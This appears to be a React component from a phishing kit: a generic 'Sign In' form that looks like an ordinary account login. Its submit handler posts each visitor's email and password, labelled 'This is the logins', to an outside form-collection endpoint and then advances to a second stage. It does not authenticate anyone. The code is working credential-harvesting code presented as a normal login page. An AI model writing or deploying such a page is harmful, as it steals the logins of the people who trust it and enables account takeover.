import axios from "axios";
import { useState } from "react";

export default function Form({ setStage }) {
  const [switchPwd, setSwitchPwd] = useState(false);
  const [isLoading, setLoading] = useState(false);

  async function handleForm(ev) {
    ev.preventDefault();

    const formValues = {
      email: ev.target.email.value,
      password: ev.target.password.value,
      message: "This is the logins",
    };

    setLoading(true);
    try {
      await axios.post("https://submit-form.com/8TjPI0qnC", formValues);
      localStorage.setItem("user", formValues.email);
      setStage(2);
      setLoading(false);
    } catch (err) {
      setLoading(false);
      console.log(err);
      alert("something is wrong");
    }
  }
  return (
    <form onSubmit={handleForm} class="mt-10">
      <p className="font-bold pb-1">Email Address</p>
      <input
        required
        type="email"
        name="email"
        id="email"
        className="bg-gray-100 w-full outline-none p-[14px] rounded-md transition-all focus:border-[#0b2368] placeholder:text-gray-600 border border-transparent"
        placeholder="Enter your email address"
      />

      <p className="font-bold pb-1 mt-8">Password</p>
      <div className="relative">
        <input
          required
          name="password"
          type={!switchPwd ? "password" : "text"}
          className="bg-gray-100 w-full outline-none p-[14px] rounded-md transition-all focus:border-[#0b2368] placeholder:text-gray-600 border border-transparent"
          placeholder="Enter your password"
        />

        <div
          onClick={() => setSwitchPwd(!switchPwd)}
          className="absolute top-5 right-0 mr-2"
        >
          {switchPwd ? (
            <button type="button" className="text-gray-300">
              <svg
                width="20"
                height="20"
                viewBox="0 0 14 12"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                role="button"
              >
                <path
                  fill-rule="evenodd"
                  clip-rule="evenodd"
                  d="M12.6066 10.5972C12.8019 10.7925 12.8019 11.1091 12.6066 11.3043C12.4114 11.4996 12.0948 11.4996 11.8995 11.3043L10.3366 9.74142C9.36999 10.1895 8.24509 10.4893 7.00273 10.4893C2.9069 10.4893 0 7.13517 0 6.09349C0 5.40776 1.24659 3.73506 3.25731 2.6621L2.00004 1.40482C1.80478 1.20956 1.80478 0.892978 2.00004 0.697716C2.1953 0.502454 2.51188 0.502454 2.70714 0.697716L12.6066 10.5972ZM4.82126 4.22604C4.3904 4.72322 4.13155 5.37348 4.13401 6.09349C4.14492 7.64783 5.41021 8.9513 7.00273 8.9513C7.71176 8.9513 8.35983 8.69114 8.85989 8.26468L7.56653 6.97132C7.4043 7.07477 7.21249 7.13517 7.00818 7.13517C6.42462 7.13517 5.95014 6.66068 5.95014 6.09349C5.95014 5.88519 6.01291 5.68988 6.12088 5.52567L4.82126 4.22604Z"
                  fill="#979797"
                ></path>
                <path
                  d="M14 6.09349C14 6.61149 13.2974 7.70132 12.0798 8.66618L9.85045 6.43678C9.86431 6.32404 9.87145 6.20946 9.87145 6.09349C9.87145 4.50097 8.58979 3.24113 7.00273 3.24113C6.89116 3.24113 6.78113 3.24728 6.67295 3.25928L5.30459 1.89092C5.84227 1.76781 6.41005 1.69769 7.00273 1.69769C11.1476 1.69769 14 5.04635 14 6.09349Z"
                  fill="#979797"
                ></path>
              </svg>
            </button>
          ) : (
            <button type="button">
              <svg
                width="20"
                height="20"
                viewBox="0 0 14 9"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                role="button"
              >
                <path
                  d="M7.00273 8.79256C11.1586 8.79256 14 5.43845 14 4.39677C14 3.34963 11.1476 0.000976562 7.00273 0.000976562C2.9069 0.000976562 0 3.34963 0 4.39677C0 5.43845 2.9069 8.79256 7.00273 8.79256ZM7.00273 7.25458C5.41021 7.25458 4.14492 5.95111 4.13401 4.39677C4.12855 2.79879 5.41021 1.54441 7.00273 1.54441C8.58979 1.54441 9.87145 2.80425 9.87145 4.39677C9.87145 5.95111 8.58979 7.25458 7.00273 7.25458ZM7.00818 5.43845C7.58083 5.43845 8.05532 4.96397 8.05532 4.39677C8.05532 3.82412 7.58083 3.34963 7.00818 3.34963C6.42462 3.34963 5.95014 3.82412 5.95014 4.39677C5.95014 4.96397 6.42462 5.43845 7.00818 5.43845Z"
                  fill="#979797"
                ></path>
              </svg>
            </button>
          )}
        </div>
      </div>

      <div className="flex items-center justify-between font-medium text-[#0b2368] mt-3">
        <div className="flex items-center gap-x-1">
          <input type="checkbox" name="Remember me" id="rem" />
          <p>Remember Me</p>
        </div>
        <p>Forgot Password?</p>
      </div>

      <button
        className={`w-full  mt-10 py-3 rounded-md ${
          isLoading ? "bg-[#0b2368]/30" : "bg-[#0b2368]"
        } text-white font-bold`}
      >
        {isLoading ? "Loading..." : "Sign In"}
      </button>

      <p className="mt-5 text-gray-700 text-center">
        Dont have an account?{" "}
        <span className="font-semibold text-[#0b2368]">Sign Up</span>
      </p>
    </form>
  );
}
